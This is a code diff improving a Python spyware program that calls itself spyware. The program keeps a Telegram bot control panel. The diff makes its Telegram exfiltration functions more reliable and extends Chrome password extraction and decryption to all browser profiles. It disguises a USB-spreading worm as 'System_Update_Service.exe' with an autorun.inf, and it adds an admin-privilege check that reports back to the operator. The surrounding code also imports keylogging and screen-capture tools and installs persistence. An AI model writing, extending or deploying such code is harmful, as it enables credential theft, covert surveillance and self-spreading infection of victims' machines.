@@ -10,23 +10,20 @@ import requests
 import logging
 import pathlib
 import json
-from telegram.ext import Updater, CommandHandler, MessageHandler, filters, ApplicationBuilder, ConversationHandler
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ConversationHandler
+from telegram.ext import filters
 from telegram import Update
 import telegram
 import time
 import cv2
 import sounddevice
 import shutil
-import browserhistory as bh
 import sqlite3
 import base64
 import win32crypt
 import sys
-from multiprocessing import Process
 from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
-from scipy.io.wavfile import write as write_rec
-from cryptography.fernet import Fernet
 import tempfile
 from Crypto.Cipher import AES
 import winreg
@@ -161,7 +158,11 @@ def check_if_already_installed():
 ################ Telegram Enhanced Functions ################
 
 def send_telegram_message(text, parse_mode='HTML', chat_id=None):
-    """Send formatted text message to Telegram"""
+    """Send formatted text message to Telegram, skip if no token"""
+    if not BOT_TOKEN or not CHAT_ID:
+        logging.warning("Telegram bot token or chat ID not set. Skipping message send.")
+        return None
+        
     if chat_id is None:
         chat_id = CHAT_ID
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -170,16 +171,27 @@ def send_telegram_message(text, parse_mode='HTML', chat_id=None):
         'text': text,
         'parse_mode': parse_mode
     }
-    try:
-        response = requests.post(url, json=payload, timeout=10)
-        response.raise_for_status()
-        return response.json()
-    except Exception as e:
-        logging.error(f'Failed to send Telegram message: {e}')
-        return None
+    
+    # Retry up to 3 times with increasing delays
+    for attempt in range(3):
+        try:
+            response = requests.post(url, json=payload, timeout=30)
+            response.raise_for_status()
+            return response.json()
+        except requests.exceptions.Timeout:
+            logging.warning(f'Telegram timeout (attempt {attempt+1}/3)')
+            time.sleep(5 * (attempt+1))
+        except Exception as e:
+            logging.error(f'Telegram error: {e}')
+            break
+    return None
 
 def send_telegram_file(file_path, caption="", chat_id=None):
-    """Send file to Telegram with caption"""
+    """Send file to Telegram with caption, skip if no token"""
+    if not BOT_TOKEN or not CHAT_ID:
+        logging.warning("Telegram bot token or chat ID not set. Skipping file send.")
+        return None
+        
     if chat_id is None:
         chat_id = CHAT_ID
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
@@ -208,30 +220,43 @@ def send_telegram_file(file_path, caption="", chat_id=None):
             if caption:
                 data['caption'] = caption[:1024]
             
-            response = requests.post(url, files=files, data=data, timeout=60)
-            response.raise_for_status()
+            # Retry up to 3 times with increasing delays
+            for attempt in range(3):
+                try:
+                    response = requests.post(url, files=files, data=data, timeout=90)
+                    response.raise_for_status()
+                    
+                    # Check for Telegram API errors in response
+                    if not response.json().get('ok'):
+                        error_msg = response.json().get('description', 'Unknown Telegram API error')
+                        logging.error(f'Telegram API error: {error_msg}')
+                        continue  # Try again
+                        
+                    return response.json()
+                    
+                except requests.exceptions.Timeout:
+                    logging.warning(f'File upload timeout (attempt {attempt+1}/3)')
+                    time.sleep(10 * (attempt+1))
+                except requests.exceptions.HTTPError as e:
+                    logging.error(f'HTTP error sending {file_path}: {e.response.text}')
+                    break
+                except Exception as e:
+                    logging.error(f'Error sending {file_path}: {str(e)}')
+                    break
             
-            # Check for Telegram API errors in response
-            if not response.json().get('ok'):
-                error_msg = response.json().get('description', 'Unknown Telegram API error')
-                logging.error(f'Telegram API error: {error_msg}')
-                return None
-                
-            return response.json()
+            # Fallback to sending as text for text files
+            if file_path.endswith('.txt'):
+                try:
+                    with open(file_path, 'r', encoding='utf-8') as f:
+                        text_content = f.read(4096)  # First 4KB
+                        return send_telegram_message(f"📄 {caption}\n{text_content}")
+                except:
+                    pass
+            return None
             
-    except requests.exceptions.HTTPError as e:
-        logging.error(f'HTTP error sending {file_path}: {e.response.text}')
     except Exception as e:
-        logging.error(f'Error sending {file_path}: {str(e)}')
-        # Try sending as text if it's a text file
-        if file_path.endswith('.txt'):
-            try:
-                with open(file_path, 'r', encoding='utf-8') as f:
-                    text_content = f.read(4096)  # First 4KB
-                    return send_telegram_message(f"📄 {caption}\n{text_content}")
-            except:
-                pass
-    return None
+        logging.error(f'General error sending file: {str(e)}')
+        return None
 
 ################ Chrome Password Extraction - FIXED VERSION ################
 
@@ -295,7 +320,7 @@ def decrypt_password(encrypted_password, master_key):
         return f"[DECRYPTION FAILED: {str(e)[:50]}]"
 
 def get_chrome_passwords():
-    """Extract AND DECRYPT saved passwords from Google Chrome"""
+    """Extract AND DECRYPT saved passwords from Google Chrome, multiple profiles"""
     passwords = []
     try:
         # Get master key first
@@ -305,59 +330,73 @@ def get_chrome_passwords():
             logging.error("Could not get Chrome master key")
             return passwords
         
-        # Chrome data path
-        chrome_path = os.path.join(
+        # Chrome data directory
+        chrome_data_dir = os.path.join(
             os.environ['USERPROFILE'],
             'AppData', 'Local', 'Google', 'Chrome',
-            'User Data', 'Default', 'Login Data'
+            'User Data'
         )
         
-        if os.path.exists(chrome_path):
-            # Copy the database to avoid lock issues
-            temp_db = os.path.join(str(BASE_LOG_PATH), 'chrome_passwords.db')
-            shutil.copy2(chrome_path, temp_db)
-            
-            # Connect to the database
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            
-            # Get passwords
-            cursor.execute("""
-                SELECT origin_url, username_value, password_value, date_created
-                FROM logins 
-                ORDER BY date_created DESC
-            """)
-            
-            decrypted_count = 0
-            total_count = 0
-            
-            for row in cursor.fetchall():
-                url = row[0]
-                username = row[1]
-                encrypted_password = row[2]
-                
-                total_count += 1
-                
-                # Decrypt the password
-                if encrypted_password:
-                    password = decrypt_password(encrypted_password, master_key)
-                    if not password.startswith('['):  # If successfully decrypted
-                        decrypted_count += 1
-                else:
-                    password = "[EMPTY]"
-                
-                passwords.append({
-                    'url': url,
-                    'username': username,
-                    'password': password,
-                    'decrypted': not password.startswith('[')
-                })
-            
-            conn.close()
-            os.remove(temp_db)
-            
-            logging.info(f"Decrypted {decrypted_count}/{total_count} passwords successfully")
-            
+        # Find all profile directories
+        profile_dirs = []
+        if os.path.exists(chrome_data_dir):
+            for entry in os.listdir(chrome_data_dir):
+                if entry.startswith("Profile") or entry == "Default":
+                    profile_path = os.path.join(chrome_data_dir, entry)
+                    if os.path.isdir(profile_path):
+                        profile_dirs.append(profile_path)
+        
+        # If no profiles found, try the Default
+        if not profile_dirs:
+            profile_dirs.append(os.path.join(chrome_data_dir, "Default"))
+        
+        for profile_dir in profile_dirs:
+            login_data_path = os.path.join(profile_dir, 'Login Data')
+            if os.path.exists(login_data_path):
+                try:
+                    # Copy the database to avoid lock issues
+                    temp_db = os.path.join(str(BASE_LOG_PATH), f'chrome_passwords_{os.path.basename(profile_dir)}.db')
+                    shutil.copy2(login_data_path, temp_db)
+                    
+                    # Connect to the database
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    
+                    # Get passwords
+                    cursor.execute("""
+                        SELECT origin_url, username_value, password_value, date_created
+                        FROM logins 
+                        ORDER BY date_created DESC
+                    """)
+                    
+                    for row in cursor.fetchall():
+                        url = row[0]
+                        username = row[1]
+                        encrypted_password = row[2]
+                        
+                        # Decrypt the password
+                        if encrypted_password:
+                            password = decrypt_password(encrypted_password, master_key)
+                        else:
+                            password = "[EMPTY]"
+                        
+                        decrypted = not password.startswith('[') and not password.startswith('DECRYPTION FAILED')
+                        passwords.append({
+                            'url': url,
+                            'username': username,
+                            'password': password,
+                            'decrypted': decrypted,
+                            'profile': os.path.basename(profile_dir)
+                        })
+                    
+                    conn.close()
+                    os.remove(temp_db)
+                    
+                except sqlite3.DatabaseError as e:
+                    logging.error(f"Chrome database error in {profile_dir}: {e}")
+                except Exception as e:
+                    logging.error(f"Error processing {profile_dir}: {e}")
+    
     except Exception as e:
         logging.error(f'Chrome password extraction error: {e}')
     
@@ -489,13 +528,14 @@ class BasicWorm:
     def __init__(self):
         # Check if running as EXE or Python script
         if getattr(sys, 'frozen', False):
-            self.worm_name = "Windows_Update_Service.exe"
+            self.worm_name = "System_Update_Service.exe"
             self.current_file = sys.executable
         else:
             self.worm_name = os.path.basename(__file__)
             self.current_file = __file__
         
         self.infected_markers = []
+        self.spread_name = "System_Update_Service.exe"
         
     def spread_via_removable_drives(self):
         """Spread to USB drives"""
@@ -505,13 +545,13 @@ class BasicWorm:
             if os.path.exists(drive):
                 try:
                     # Copy the EXE to USB with convincing name
-                    dest_path = os.path.join(drive, "Windows_Update_Service.exe")
+                    dest_path = os.path.join(drive, self.spread_name)
                     shutil.copy2(self.current_file, dest_path)
                     
                     # Create autorun.inf
-                    autorun_content = '''[AutoRun]
-open=Windows_Update_Service.exe
-action=Run Windows Update Service
+                    autorun_content = f'''[AutoRun]
+            open={self.spread_name}
+            action=Run Windows Update Service
 '''
                     autorun_path = os.path.join(drive, "autorun.inf")
                     with open(autorun_path, 'w') as f:
@@ -640,6 +680,14 @@ def main():
             install_persistence()
             return
         
+        # Check for admin privileges (Windows only)
+        try:
+            if not ctypes.windll.shell32.IsUserAnAdmin():
+                send_telegram_message("⚠️ <b>WARNING: Not running as administrator. Some features may fail.</b>")
+        except Exception as e:
+            logging.error(f"Admin check failed: {e}")
+            send_telegram_message(f"⚠️ <b>Admin check error:</b> {str(e)[:100]}")
+
         # === PHASE 0: PERSISTENCE INSTALLATION ===
         send_telegram_message("🚀 <b>SPYWARE INITIALIZATION STARTED</b>")
         
@@ -850,10 +898,10 @@ def main():
         async def start(update: Update, context):
             await update.message.reply_text(f"""
 🤖 <b>Spyware Control Panel - ACTIVE</b>
-━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━
 👤 User: {WINDOWS_USERNAME}
 💻 System: {hostname}
-━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━
 <b>Commands:</b>
 /list [path] - List directory contents
 /cd [path] - Change current directory
@@ -1004,6 +1052,12 @@ Current directory: {current_dir}
 
 if __name__ == '__main__':
     try:
+        # Validate Telegram credentials before starting
+        if not BOT_TOKEN or not CHAT_ID:
+            print("ERROR: Telegram credentials not configured!")
+            print("Please set BOT_TOKEN and CHAT_ID in .env file")
+            sys.exit(1)
+            
         # Test connection
         send_telegram_message("🤖 <b>SYSTEM ONLINE</b>\nStarting persistent spyware installation...")
         main()
